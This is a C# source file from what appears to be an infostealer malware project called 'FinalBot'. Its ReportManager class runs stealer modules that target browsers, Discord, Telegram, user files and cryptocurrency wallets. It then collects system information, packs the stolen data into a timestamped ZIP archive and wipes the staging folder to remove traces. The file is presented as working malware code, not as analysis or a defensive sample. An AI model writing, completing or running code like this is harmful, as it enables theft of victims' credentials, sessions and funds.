using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using FinalBot.Stealers;
using FinalBot.Modules;

namespace FinalBot
{
    public static class ReportManager
    {
        public static async Task<string?> CreateFullReport()
        {
            string tempDir = Path.Combine(Path.GetTempPath(), $"Report_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(tempDir);

            try 
            {
                // 1. Run Stealers
                var browserStealer = new BrowserStealer();
                await browserStealer.RunAll(); // This should ideally write to files in tempDir

                var discordStealer = new DiscordStealer();
                await discordStealer.Run(); // Same here

                var telegramStealer = new TelegramStealer();
                await telegramStealer.Run(tempDir);

                var fileStealer = new FileStealer();
                await fileStealer.Run(tempDir);

                var walletStealer = new WalletStealer();
                await walletStealer.Run(tempDir);

                // 2. System Info
                string sysInfo = SystemInfoModule.GetSystemInfo();
                File.WriteAllText(Path.Combine(tempDir, "System_Info.txt"), sysInfo);

                // 3. ZIP everything
                string zipPath = tempDir + ".zip";
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // 4. Cleanup temp dir
                WiperModule.WipeDirectory(tempDir);

                return zipPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[REPORT ERROR] {ex.Message}");
                return null;
            }
        }
    }
}
